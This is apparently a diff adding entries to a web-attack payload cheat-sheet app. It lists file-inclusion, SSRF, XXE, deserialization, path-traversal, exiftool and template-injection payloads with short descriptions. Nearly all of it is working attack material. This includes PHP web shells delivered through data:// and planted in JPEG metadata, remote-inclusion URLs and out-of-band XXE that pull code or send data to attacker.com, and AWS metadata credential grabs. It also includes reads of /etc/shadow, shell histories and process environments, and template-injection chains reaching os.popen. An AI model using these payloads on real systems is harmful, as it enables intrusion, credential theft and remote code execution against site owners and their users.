+{"id":384,"category":"File Inclusion (LFI/RFI)","subcategory":"Apache config","payload":"%2fetc%2fapache2%2fhttpd.conf","description":"URL-encoded Apache main config."},
+{"id":385,"category":"File Inclusion (LFI/RFI)","subcategory":"Nginx config","payload":"%2fetc%2fnginx%2fnginx.conf","description":"URL-encoded Nginx main config."},
+{"id":386,"category":"File Inclusion (LFI/RFI)","subcategory":"PHP config","payload":"%2fetc%2fphp%2fphp.ini","description":"URL-encoded PHP config file."},
+{"id":387,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - environ","payload":"%2fproc%2fself%2fenviron","description":"Process environment (may contain secrets)."},
+{"id":388,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - cmdline","payload":"%2fproc%2fself%2fcmdline","description":"Current process command line."},
+{"id":389,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - fd 0","payload":"%2fproc%2fself%2ffd%2f0","description":"stdin file descriptor."},
+{"id":390,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - fd 1","payload":"%2fproc%2fself%2ffd%2f1","description":"stdout file descriptor."},
+{"id":391,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - fd 2","payload":"%2fproc%2fself%2ffd%2f2","description":"stderr file descriptor."},
+{"id":392,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - version","payload":"%2fproc%2fversion","description":"Kernel version banner."},
+{"id":393,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - cpuinfo","payload":"%2fproc%2fcpuinfo","description":"CPU details."},
+{"id":394,"category":"File Inclusion (LFI/RFI)","subcategory":"Proc - meminfo","payload":"%2fproc%2fmeminfo","description":"Memory information."},
+{"id":395,"category":"File Inclusion (LFI/RFI)","subcategory":"Log - apache2 access","payload":"%2fvar%2flog%2fapache2%2faccess.log","description":"Apache2 access log (log poisoning target)."},
+{"id":396,"category":"File Inclusion (LFI/RFI)","subcategory":"Log - nginx access","payload":"%2fvar%2flog%2fnginx%2faccess.log","description":"Nginx access log."},
+{"id":397,"category":"File Inclusion (LFI/RFI)","subcategory":"Log - httpd access","payload":"%2fvar%2flog%2fhttpd%2faccess_log","description":"RHEL httpd access log."},
+{"id":398,"category":"File Inclusion (LFI/RFI)","subcategory":"Webroot - index.php","payload":"%2fvar%2fwww%2fhtml%2findex.php","description":"Debian webroot index."},
+{"id":399,"category":"File Inclusion (LFI/RFI)","subcategory":"Webroot - /var/www","payload":"%2fvar%2fwww%2findex.php","description":"Alternate webroot."},
+{"id":400,"category":"File Inclusion (LFI/RFI)","subcategory":"Webroot - config.php","payload":"%2fvar%2fwww%2fhtml%2fconfig.php","description":"Likely DB credentials file."},
+{"id":401,"category":"File Inclusion (LFI/RFI)","subcategory":"Bash history (user)","payload":"%2fhome%2fuser%2f.bash_history","description":"User command history."},
+{"id":402,"category":"File Inclusion (LFI/RFI)","subcategory":"Bash history (root)","payload":"%2froot%2f.bash_history","description":"Root command history."},
+{"id":403,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter - base64 index","payload":"php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dindex.php","description":"Read index.php source as base64."},
+{"id":404,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter - base64 passwd","payload":"php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3d%2fetc%2fpasswd","description":"Base64-wrap /etc/passwd read."},
+{"id":405,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter + traversal","payload":"php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3d..%2f..%2f..%2f..%2fetc%2fpasswd","description":"Combined traversal + filter wrapper."},
+{"id":406,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter - config.php","payload":"php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dconfig.php","description":"Read config.php source as base64."},
+{"id":407,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter - webroot config","payload":"php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3d..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2fconfig.php","description":"Traversal + filter to webroot config."},
+{"id":408,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter - read base64","payload":"php%3a%2f%2ffilter%2fread%3dconvert.base64-encode%2fresource%3dindex.php","description":"Alternative 'read=' form of the base64 filter."},
+{"id":409,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter - iconv utf16","payload":"php%3a%2f%2ffilter%2fconvert.iconv.utf-8.utf-16%2fresource%3dindex.php","description":"iconv conversion filter for source disclosure."},
+{"id":410,"category":"File Inclusion (LFI/RFI)","subcategory":"php filter - chained","payload":"php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dphp%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3dindex.php","description":"Chained filters for double encoding."},
+{"id":411,"category":"File Inclusion (LFI/RFI)","subcategory":"php input","payload":"php%3a%2f%2finput","description":"php://input — read raw request body as code."},
+{"id":412,"category":"File Inclusion (LFI/RFI)","subcategory":"data - base64 PHP","payload":"data%3a%2f%2ftext%2fplain%3bbase64%2cPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b","description":"Base64 PHP web shell via data:// wrapper."},
+{"id":413,"category":"File Inclusion (LFI/RFI)","subcategory":"data - URL-encoded PHP","payload":"data%3a%2f%2ftext%2fplain%2c%3c%3fphp%20system%28%24_GET%5b%27cmd%27%5d%29%3b%20%3f%3e","description":"URL-encoded PHP payload via data://."},
+{"id":414,"category":"File Inclusion (LFI/RFI)","subcategory":"data - HTML XSS","payload":"data%3a%2f%2ftext%2fhtml%2c%3cscript%3ealert(1)%3c%2fscript%3e","description":"XSS payload via data:// HTML."},
+{"id":415,"category":"File Inclusion (LFI/RFI)","subcategory":"data - phpinfo","payload":"data%3a%2f%2ftext%2fplain%2c%3c%3fphp%20phpinfo%28%29%3b%20%3f%3e","description":"phpinfo() via data:// wrapper."},
+{"id":416,"category":"File Inclusion (LFI/RFI)","subcategory":"expect - id","payload":"expect%3a%2f%2fid","description":"expect:// wrapper command execution."},
+{"id":417,"category":"File Inclusion (LFI/RFI)","subcategory":"expect - whoami","payload":"expect%3a%2f%2fwhoami","description":"expect://whoami."},
+{"id":418,"category":"File Inclusion (LFI/RFI)","subcategory":"expect - ls","payload":"expect%3a%2f%2fls","description":"expect://ls."},
+{"id":419,"category":"File Inclusion (LFI/RFI)","subcategory":"zip wrapper","payload":"zip%3a%2f%2f%2fetc%2fpasswd","description":"zip:// wrapper (nested archive read)."},
+{"id":420,"category":"File Inclusion (LFI/RFI)","subcategory":"phar wrapper","payload":"phar%3a%2f%2f%2fetc%2fpasswd","description":"phar:// wrapper for archive/deserialization."},
+{"id":421,"category":"File Inclusion (LFI/RFI)","subcategory":"zlib wrapper","payload":"compress.zlib%3a%2f%2f%2fetc%2fpasswd","description":"compress.zlib:// wrapper."},
+{"id":422,"category":"File Inclusion (LFI/RFI)","subcategory":"file scheme","payload":"file%3a%2f%2f%2fetc%2fpasswd","description":"file:// local file read."},
+{"id":423,"category":"File Inclusion (LFI/RFI)","subcategory":"file scheme + null","payload":"file%3a%2f%2f%2fetc%2fpasswd%00","description":"file:// with trailing null byte."},
+{"id":424,"category":"File Inclusion (LFI/RFI)","subcategory":"file scheme - Windows","payload":"file%3a%2f%2f%2fc%3a%2fwindows%2fwin.ini","description":"file:// on a Windows target."},
+{"id":425,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - http","payload":"http%3a%2f%2fattacker.com%2fshell.txt","description":"Remote shell via http://."},
+{"id":426,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - https","payload":"https%3a%2f%2fattacker.com%2fshell.txt","description":"Remote shell via https://."},
+{"id":427,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - mixed case","payload":"hTtP%3a%2f%2fattacker.com%2fshell.txt","description":"Mixed-case scheme to bypass case-sensitive blacklists."},
+{"id":428,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - protocol-relative","payload":"%2f%2fattacker.com%2fshell.txt","description":"Protocol-relative URL."},
+{"id":429,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - query suffix","payload":"http%3a%2f%2fattacker.com%2fshell.txt%3f","description":"Trailing ? to confuse extension checks."},
+{"id":430,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - fragment suffix","payload":"http%3a%2f%2fattacker.com%2fshell.txt%23","description":"Trailing # to confuse extension checks."},
+{"id":431,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - query + fragment","payload":"http%3a%2f%2fattacker.com%2fshell.txt%3f%23","description":"Both ? and # as suffix cutters."},
+{"id":432,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - null byte","payload":"http%3a%2f%2fattacker.com%2fshell.txt%00","description":"Null byte to truncate an appended extension."},
+{"id":433,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - forced .php","payload":"http%3a%2f%2fattacker.com%2fshell.txt%2f.php","description":"Appends /.php to satisfy extension enforcement."},
+{"id":434,"category":"File Inclusion (LFI/RFI)","subcategory":"RFI - query + .php","payload":"http%3a%2f%2fattacker.com%2fshell.txt%3f%2f.php","description":"? + /.php combined."},
+
+/* ============================================================
+   SERVER-SIDE REQUEST FORGERY (SSRF)
+   ============================================================ */
+{"id":435,"category":"Server-Side Request Forgery (SSRF)","subcategory":"AWS metadata","payload":"http://169.254.169.254/latest/meta-data/","description":"Cloud instance metadata endpoint (IAM creds, etc.)."},
+{"id":436,"category":"Server-Side Request Forgery (SSRF)","subcategory":"Localhost admin","payload":"http://127.0.0.1:8080/admin","description":"Reach internal-only services bound to loopback."},
+{"id":437,"category":"Server-Side Request Forgery (SSRF)","subcategory":"file scheme","payload":"file:///etc/passwd","description":"Local file read via file:// where the fetcher allows it."},
+{"id":438,"category":"Server-Side Request Forgery (SSRF)","subcategory":"gopher smuggling","payload":"gopher://localhost:8080/_GET /admin HTTP/1.0%0d%0a","description":"Smuggle raw bytes to internal services via gopher."},
+{"id":439,"category":"Server-Side Request Forgery (SSRF)","subcategory":"dict scheme","payload":"dict://localhost:11211/stat","description":"Interact with memcached/other line protocols via dict://."},
+
+/* ============================================================
+   XML EXTERNAL ENTITY (XXE)
+   ============================================================ */
+{"id":440,"category":"XML External Entity (XXE)","subcategory":"Classic file read","payload":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;<\/root>","description":"In-band XXE reading a local file into the response."},
+{"id":441,"category":"XML External Entity (XXE)","subcategory":"OOB parameter entity","payload":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;]>","description":"Loads an external DTD for out-of-band / blind exfiltration."},
+{"id":442,"category":"XML External Entity (XXE)","subcategory":"Billion Laughs (DoS)","payload":"<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">","description":"Entity-expansion denial of service (lab use only)."},
+{"id":443,"category":"XML External Entity (XXE)","subcategory":"Classic (encoded)","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20root%20%5b%3c%21ENTITY%20test%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3croot%3e%26test%3b%3c%2froot%3e","description":"URL-encoded in-band XXE reading /etc/passwd."},
+{"id":444,"category":"XML External Entity (XXE)","subcategory":"Classic + null","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20root%20%5b%3c%21ENTITY%20test%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3croot%3e%26test%3b%3c%2froot%3e%00","description":"Encoded XXE with trailing null byte."},
+{"id":445,"category":"XML External Entity (XXE)","subcategory":"Shadow file","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20root%20%5b%3c%21ENTITY%20test%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fshadow%22%3e%5d%3e%3croot%3e%26test%3b%3c%2froot%3e","description":"XXE targeting /etc/shadow."},
+{"id":446,"category":"XML External Entity (XXE)","subcategory":"PHP filter base64","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20root%20%5b%3c%21ENTITY%20test%20SYSTEM%20%22php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource%3d%2fetc%2fpasswd%22%3e%5d%3e%3croot%3e%26test%3b%3c%2froot%3e","description":"XXE using php://filter to base64-wrap the read."},
+{"id":447,"category":"XML External Entity (XXE)","subcategory":"OOB parameter entity (encoded)","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20root%20%5b%3c%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2fattacker.com%2fxxe.dtd%22%3e%25remote%3b%5d%3e","description":"Out-of-band XXE loading a remote DTD."},
+{"id":448,"category":"XML External Entity (XXE)","subcategory":"OOB + exfil chain","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20root%20%5b%3c%21ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2fattacker.com%2fxxe.dtd%22%3e%25remote%3b%25int%3b%25send%3b%5d%3e","description":"OOB XXE with param-entity exfiltration chain."},
+{"id":449,"category":"XML External Entity (XXE)","subcategory":"Error-based OOB","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20root%20%5b%3c%21ENTITY%20%25%20file%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%3c%21ENTITY%20%25%20eval%20%22%3c%21ENTITY%20%26%23x25%3b%20error%20SYSTEM%20%27file%3a%2f%2f%2fnonexistent%2f%25file%3b%27%3e%22%3e%25eval%3b%25error%3b%5d%3e","description":"Error-based OOB XXE leaking file content via DTD error."},
+{"id":450,"category":"XML External Entity (XXE)","subcategory":"Billion Laughs (encoded)","payload":"%3c%3fxml%20version%3d%221.0%22%3f%3e%3c%21DOCTYPE%20lolz%20%5b%3c%21ENTITY%20lol%20%22lol%22%3e%3c%21ENTITY%20lol2%20%22%26lol%3b%26lol%3b%26lol%3b%26lol%3b%26lol%3b%26lol%3b%26lol%3b%26lol%3b%26lol%3b%26lol%3b%22%3e%3c%21ENTITY%20lol3%20%22%26lol2%3b%26lol2%3b%26lol2%3b%26lol2%3b%26lol2%3b%26lol2%3b%26lol2%3b%26lol2%3b%26lol2%3b%26lol2%3b%22%3e%5d%3e%3clolz%3e%26lol3%3b%3c%2flolz%3e","description":"URL-encoded entity-expansion DoS (lab only)."},
+
+/* ============================================================
+   DESERIALIZATION
+   ============================================================ */
+{"id":451,"category":"Deserialization","subcategory":"PHP object","payload":"O:4:\"User\":1:{s:4:\"name\";s:4:\"admin\";}","description":"Serialized PHP object; mutate properties to abuse magic methods."},
+{"id":452,"category":"Deserialization","subcategory":"Java stream magic","payload":"AC ED 00 05   (hex)    rO0ABXNy...  (base64)","description":"Java serialized-stream signature markers to recognise/craft gadget chains."},
+{"id":453,"category":"Deserialization","subcategory":"Python pickle","payload":"cos\\nsystem\\n(S'whoami'\\ntR.","description":"Pickle opcode stream invoking os.system on load."},
+{"id":454,"category":"Deserialization","subcategory":".NET ViewState","payload":"/wEPDwUJ...","description":"MAC-less ViewState is a common .NET deserialization sink."},
+
+/* ============================================================
+   PATH TRAVERSAL
+   ============================================================ */
+{"id":455,"category":"Path Traversal","subcategory":"Deep traversal","payload":"../../../../../../etc/passwd","description":"Over-long traversal to reach filesystem root reliably."},
+{"id":456,"category":"Path Traversal","subcategory":"Windows traversal","payload":"..\\..\\..\\..\\windows\\win.ini","description":"Backslash traversal for Windows targets."},
+{"id":457,"category":"Path Traversal","subcategory":"Nested bypass","payload":"....//....//....//etc/passwd","description":"Defeats a single non-recursive '../' strip."},
+{"id":458,"category":"Path Traversal","subcategory":"URL-encoded","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Percent-encoded '../../../etc/passwd'."},
+{"id":459,"category":"Path Traversal","subcategory":"Semicolon path","payload":"..;/..;/..;/etc/passwd","description":"Tomcat/Java path-parameter traversal trick."},
+{"id":460,"category":"Path Traversal","subcategory":"Encoded (4 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Four-level URL-encoded traversal."},
+{"id":461,"category":"Path Traversal","subcategory":"Encoded (5 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Five-level URL-encoded traversal."},
+{"id":462,"category":"Path Traversal","subcategory":"Encoded (6 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Six-level URL-encoded traversal."},
+{"id":463,"category":"Path Traversal","subcategory":"Encoded (7 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Seven-level URL-encoded traversal."},
+{"id":464,"category":"Path Traversal","subcategory":"Encoded (8 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Eight-level URL-encoded traversal."},
+{"id":465,"category":"Path Traversal","subcategory":"Encoded (9 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Nine-level URL-encoded traversal."},
+{"id":466,"category":"Path Traversal","subcategory":"Encoded (10 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Ten-level URL-encoded traversal."},
+{"id":467,"category":"Path Traversal","subcategory":"Encoded (11 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Eleven-level URL-encoded traversal."},
+{"id":468,"category":"Path Traversal","subcategory":"Encoded (12 levels)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","description":"Twelve-level URL-encoded traversal."},
+{"id":469,"category":"Path Traversal","subcategory":"Nested // x3","payload":"....//....//....//etc/passwd","description":"Triple nested-slash bypass."},
+{"id":470,"category":"Path Traversal","subcategory":"Nested // x4","payload":"....//....//....//....//etc/passwd","description":"Quadruple nested-slash bypass."},
+{"id":471,"category":"Path Traversal","subcategory":"Nested // x5","payload":"....//....//....//....//....//etc/passwd","description":"Five-level nested-slash bypass."},
+{"id":472,"category":"Path Traversal","subcategory":"Nested // x6","payload":"....//....//....//....//....//....//etc/passwd","description":"Six-level nested-slash bypass."},
+{"id":473,"category":"Path Traversal","subcategory":"Nested // x7","payload":"....//....//....//....//....//....//....//etc/passwd","description":"Seven-level nested-slash bypass."},
+{"id":474,"category":"Path Traversal","subcategory":"Alternating ./ x3","payload":"..././..././..././etc/passwd","description":"Alternating dots/slashes to bypass naive filters."},
+{"id":475,"category":"Path Traversal","subcategory":"Alternating ./ x4","payload":"..././..././..././..././etc/passwd","description":"Four-level alternating bypass."},
+{"id":476,"category":"Path Traversal","subcategory":"Alternating ./ x5","payload":"..././..././..././..././..././etc/passwd","description":"Five-level alternating bypass."},
+{"id":477,"category":"Path Traversal","subcategory":"Partial URL-encoded (4)","payload":"..%2f..%2f..%2f..%2fetc%2fpasswd","description":"Mixed literal dots with encoded slashes (4 levels)."},
+{"id":478,"category":"Path Traversal","subcategory":"Partial URL-encoded (5)","payload":"..%2f..%2f..%2f..%2f..%2fetc%2fpasswd","description":"Five-level partial encoding."},
+{"id":479,"category":"Path Traversal","subcategory":"Partial URL-encoded (6)","payload":"..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd","description":"Six-level partial encoding."},
+{"id":480,"category":"Path Traversal","subcategory":"Double URL-encoded (3)","payload":"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd","description":"Double-encoded traversal (3 levels)."},
+{"id":481,"category":"Path Traversal","subcategory":"Double URL-encoded (4)","payload":"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd","description":"Double-encoded traversal (4 levels)."},
+{"id":482,"category":"Path Traversal","subcategory":"Double URL-encoded (5)","payload":"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd","description":"Double-encoded traversal (5 levels)."},
+{"id":483,"category":"Path Traversal","subcategory":"Overlong UTF-8 slash (3)","payload":"%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%2fpasswd","description":"Overlong UTF-8 slash (0xC0 0xAF) — 3 levels."},
+{"id":484,"category":"Path Traversal","subcategory":"Overlong UTF-8 slash (4)","payload":"%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%2fpasswd","description":"Overlong UTF-8 slash — 4 levels."},
+{"id":485,"category":"Path Traversal","subcategory":"Overlong UTF-8 dot (3)","payload":"%2e%2e%c0%ae%2e%2e%c0%ae%2e%2e%c0%aeetc%2fpasswd","description":"Overlong UTF-8 dot encoding — 3 levels."},
+{"id":486,"category":"Path Traversal","subcategory":"Windows encoded backslash (3)","payload":"%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini","description":"URL-encoded backslash traversal for Windows."},
+{"id":487,"category":"Path Traversal","subcategory":"Windows encoded backslash (4)","payload":"%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini","description":"Four-level encoded backslash traversal."},
+{"id":488,"category":"Path Traversal","subcategory":"Windows encoded backslash (5)","payload":"%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini","description":"Five-level encoded backslash traversal."},
+{"id":489,"category":"Path Traversal","subcategory":"Windows partial backslash (3)","payload":"..%5c..%5c..%5cwindows%5cwin.ini","description":"Partially encoded backslash traversal (3)."},
+{"id":490,"category":"Path Traversal","subcategory":"Windows partial backslash (4)","payload":"..%5c..%5c..%5c..%5cwindows%5cwin.ini","description":"Partially encoded backslash traversal (4)."},
+{"id":491,"category":"Path Traversal","subcategory":"Windows encoded forward-slash (3)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini","description":"URL-encoded forward-slash traversal to win.ini (3)."},
+{"id":492,"category":"Path Traversal","subcategory":"Windows encoded forward-slash (4)","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini","description":"Four-level forward-slash traversal."},
+{"id":493,"category":"Path Traversal","subcategory":"Windows null-byte suffix","payload":"%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini%00","description":"Windows win.ini with trailing null byte."},
+{"id":494,"category":"Path Traversal","subcategory":"Null byte suffix","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00","description":"Null byte terminates any appended extension."},
+{"id":495,"category":"Path Traversal","subcategory":"Double-encoded null byte","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%2500","description":"Double-encoded null byte for a second decode pass."},
+{"id":496,"category":"Path Traversal","subcategory":"Query-string trick","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%3f","description":"Trailing ? so the app ignores the suffix."},
+{"id":497,"category":"Path Traversal","subcategory":"Fragment trick","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%23","description":"Trailing # so the app ignores the suffix."},
+{"id":498,"category":"Path Traversal","subcategory":"Query + fragment","payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%3f%23","description":"Both ? and # as suffix cutters."},
+
+/* ============================================================
+   EXIFTOOL COMMANDS
+   ============================================================ */
+{"id":499,"category":"Exiftool Commands","subcategory":"Inject PHP comment","payload":"exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg","description":"Write a PHP payload into the JPEG comment tag."},
+{"id":500,"category":"Exiftool Commands","subcategory":"Multi-tag payload","payload":"exiftool -Copyright='Payload' -Artist='Pentest' image.jpg","description":"Populate multiple metadata fields."},
+{"id":501,"category":"Exiftool Commands","subcategory":"Strip all metadata","payload":"exiftool -all= image.jpg","description":"Remove all metadata (cleanup / OPSEC)."},
+{"id":502,"category":"Exiftool Commands","subcategory":"Extract thumbnail","payload":"exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg","description":"Dump an embedded thumbnail (can hide data)."},
+{"id":503,"category":"Exiftool Commands","subcategory":"Verbose dump","payload":"exiftool -v image.jpg","description":"Verbose metadata inspection."},
+
+/* ============================================================
+   SERVER-SIDE TEMPLATE INJECTION (SSTI)
+   ============================================================ */
+{"id":504,"category":"Server-Side Template Injection (SSTI)","subcategory":"Arithmetic probe","payload":"{{7*7}}","description":"Classic SSTI detection — result of 49 confirms template evaluation."},
+{"id":505,"category":"Server-Side Template Injection (SSTI)","subcategory":"String arithmetic probe","payload":"{{7*'7'}}","description":"Returns '7777777' on Jinja2/Twig, distinguishing engines."},
+{"id":506,"category":"Server-Side Template Injection (SSTI)","subcategory":"Config leak","payload":"{{config}}","description":"Dump Flask config object."},
+{"id":507,"category":"Server-Side Template Injection (SSTI)","subcategory":"Config items","payload":"{{config.items()}}","description":"Dump config items as iterable of (key, value)."},
+{"id":508,"category":"Server-Side Template Injection (SSTI)","subcategory":"Self object","payload":"{{self}}","description":"Reference the template's own scope object."},
+{"id":509,"category":"Server-Side Template Injection (SSTI)","subcategory":"Request object","payload":"{{request}}","description":"Reference the current Flask request object."},
+{"id":510,"category":"Server-Side Template Injection (SSTI)","subcategory":"Request application","payload":"{{request.application}}","description":"Reach the WSGI application via request."},
+{"id":511,"category":"Server-Side Template Injection (SSTI)","subcategory":"Request environ","payload":"{{request.environ}}","description":"Dump WSGI environ (secrets, headers, etc.)."},
+{"id":512,"category":"Server-Side Template Injection (SSTI)","subcategory":"App object","payload":"{{app}}","description":"Reference the Flask app object."},
+{"id":513,"category":"Server-Side Template Injection (SSTI)","subcategory":"Flask get_flashed_messages","payload":"{{get_flashed_messages}}","description":"Call Flask's flash message accessor (globals enumeration)."},
+{"id":514,"category":"Server-Side Template Injection (SSTI)","subcategory":"url_for","payload":"{{url_for}}","description":"Reference Flask url_for in the template globals."},
+{"id":515,"category":"Server-Side Template Injection (SSTI)","subcategory":"MRO subclasses (idx 2)","payload":"{{''.__class__.__mro__[2].__subclasses__()}}","description":"Enumerate subclasses of object — find useful classes for RCE."},
+{"id":516,"category":"Server-Side Template Injection (SSTI)","subcategory":"MRO subclasses (idx 1)","payload":"{{''.__class__.__mro__[1].__subclasses__()}}","description":"Same, MRO index 1 (base type)."},
+{"id":517,"category":"Server-Side Template Injection (SSTI)","subcategory":"MRO subclasses (idx 0)","payload":"{{''.__class__.__mro__[0].__subclasses__()}}","description":"Same, MRO index 0 (str)."},
+{"id":518,"category":"Server-Side Template Injection (SSTI)","subcategory":"Read /etc/passwd (idx 40)","payload":"{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}","description":"Classic file read via the file() subclass (Python 2)."},
+{"id":519,"category":"Server-Side Template Injection (SSTI)","subcategory":"Globals via linecache","payload":"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('id').read()}}","description":"Reach os.popen through linecache globals for RCE (truncated form in source)."}
+];
+
+const CATEGORIES = [
+  "Upload Insecure Files","PHP Web Shells","Web Shells (One-liners)","Polyglot Payloads",
+  "Command Injection","Cross-Site Scripting (XSS)","SQL Injection","File Inclusion (LFI/RFI)",
+  "Server-Side Request Forgery (SSRF)","XML External Entity (XXE)","Deserialization",
+  "Path Traversal","Exiftool Commands","Server-Side Template Injection (SSTI)"
+];
 
 // Per-category accent colors for the left bars / nav.
 const COLORS = {
   "Upload Insecure Files":"#f778ba","PHP Web Shells":"#ff7b72","Web Shells (One-liners)":"#ffa657",
   "Polyglot Payloads":"#d2a8ff","Command Injection":"#ff9492","Cross-Site Scripting (XSS)":"#7ee787",
-  "SQL Injection":"#79c0ff","File Inclusion (LFI/RFI)":"#56d4dd","Server-Side Request Forgery (SSRF)":"#f0883e",
-  "XML External Entity (XXE)":"#a5d6ff","Deserialization":"#e3b341","Path Traversal":"#6cb6ff",
-  "Exiftool Commands":"#8ddb8c"
+  "SQL Injection":"#79c0ff","File Inclusion (LFI/RFI)":"#56d4dd",
+  "Server-Side Request Forgery (SSRF)":"#f0883e","XML External Entity (XXE)":"#a5d6ff",
+  "Deserialization":"#e3b341","Path Traversal":"#6cb6ff","Exiftool Commands":"#8ddb8c",
+  "Server-Side Template Injection (SSTI)":"#ff7b9c"
 };
 function slug(s){return s.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-|-$/g,'');}
 
 // --- lightweight, safe syntax highlighting -----------------------------
-// Operates on an already text-escaped string, so we escape first then wrap tokens.
 function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function highlight(raw){
   let s = esc(raw);
-  // comments (# ... at line start-ish) — keep simple
